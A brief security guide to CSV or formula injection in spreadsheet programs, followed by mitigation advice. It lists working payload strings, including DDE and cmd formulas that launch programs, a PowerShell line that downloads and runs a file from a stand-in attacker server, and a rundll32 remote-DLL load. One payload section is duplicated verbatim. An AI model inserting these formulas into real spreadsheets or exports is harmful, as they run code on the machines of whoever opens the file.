
# CSV Injection (Formula Injection) Security Guide

## Overview
CSV Injection, also known as **Formula Injection**, is a security vulnerability where malicious users can inject formulas or commands into CSV files. This attack is executed through formulas that are automatically evaluated when applications like **Microsoft Excel** or **LibreOffice Calc** open the CSV file.

---

## Payload Examples
The following list, based on examples from *System Weakness*, shows common payloads used to exploit this vulnerability by attempting to execute commands on a victim's machine.

---

## 1. DDE (Dynamic Data Exchange) & Command Execution
These payloads abuse the **DDE function** or the `cmd` command to launch system applications like the calculator or Notepad, demonstrating **remote code execution** potential.

```text
DDE ("cmd";"/C calc";"!A0")A0
=cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
```

More advanced payloads can be used to download and execute code from a remote server.

```text
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```

## 2. Formula-Based Injection
Malicious formulas can be embedded within other seemingly benign calculations to evade simple detection.

```text
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
```

##2. Formula-Based Injection
Malicious formulas can be embedded within other seemingly benign calculations to evade simple detection.

```text
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
```


## Mitigation Strategies
To prevent CSV injection attacks, it is crucial to implement proper input validation and output encoding. The source article stresses that user input should always be sanitized and filtered before processing.

Input Validation & Sanitization: Treat all user-supplied data that will be included in a CSV file as untrusted. Scrub data to remove or neutralize dangerous characters like the leading equals sign (=), plus (+), minus (-), at sign (@), and the pipe (|) or DDE formula constructs.

Output Encoding: When generating CSV files, encode cell values to prevent them from being interpreted as formulas. A common method is to prefix risky cells with a tab character or single quote (').

User Education: Warn users, especially those handling sensitive data, about the risks of opening CSV files from untrusted sources in spreadsheet applications. Advise them to use plain text viewers or disable automatic formula calculation when possible.
